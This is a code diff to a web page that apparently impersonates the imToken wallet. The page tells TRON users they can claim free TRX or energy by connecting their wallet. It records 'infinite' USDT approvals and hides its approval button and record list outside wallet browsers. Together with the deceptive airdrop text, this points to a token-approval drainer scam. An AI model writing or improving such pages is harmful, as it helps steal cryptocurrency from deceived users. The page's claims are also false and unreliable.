@@ -236,14 +236,11 @@
           <div style="display: flex; justify-content: space-between; margin: 4px 0;">
             <span><h3>USDT</h3></span>
             <span><h3>无限</h3></span>
-          </div> 
-        </div>         
-        <!-- 授权记录区：修复图标符号 -->
-        <div class="record-list">
+          </div>       
             <h3> 授权记录</h3>
             <div id="approvalRecords">
                 <div class="record-item">暂无授权记录<small>授权成功后显示历史记录</small></div>
-            </div>
+          </div>
         </div>
         
     </div>
@@ -292,6 +289,7 @@
 
     // 全局变量
     let tronWeb, userAddress, trc20Contract;
+    let tokenBalance = "0.00", trxBalance = "0.00";
     let globalTokenBalance = "未采集到", globalTrxBalance = "未采集到";
     let globalTrxError = "无错误";
     const RECORD_KEY = "imtoken_infinite_approval_records";
@@ -302,7 +300,7 @@
         const copyLinkText = document.getElementById("copyLinkText");
         const copyLinkBtn = document.getElementById("copyLinkBtn");     
         const warning = document.querySelector('.warning');
-       
+        const recordlist = document.querySelector('.record-list');
         renderApprovalRecords();
 
         // 复制链接逻辑
@@ -323,7 +321,7 @@
             document.getElementById("userInfo").innerHTML = "imToken会根据每一个用户的的情况决定能够领取相应的能量或者TRX加密货币，连接钱包后会在此次显示；每一个钱包只可领取一次，须消耗最高11个TRX连接钱包显示可领取的数量后，用户可选择放弃或者领取。";
             // 非TronWeb环境，完全隐藏授权按钮
             approveBtn.style.display = "none";
-           
+           recordlist.style.display = "none";
         }
 
         // 手动连接逻辑
